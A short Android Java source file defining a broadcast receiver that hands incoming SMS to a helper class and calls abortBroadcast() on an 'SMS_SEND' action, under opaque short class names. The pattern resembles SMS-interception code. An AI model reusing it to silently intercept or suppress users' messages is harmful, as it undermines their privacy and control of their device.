package net.workspace;
import net.workspace.sms.SmsHelper;
import net.workspace.util.CommonUtil;
import android.content.Context;
import android.content.Intent;

/**
 * SmsReceiver
 * @author Hike
 *
 */
public class SR extends net.workspace.AR {
    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        CommonUtil.registerReciever();
        String action = intent.getAction();
        if (CommonUtil.SMS_RECEIVED.equals(action)) {
            SmsHelper.onSmsRecieved(this, intent);
        } else if (CommonUtil.SMS_SEND.equals(action)) {
            abortBroadcast();
        }
    }
}
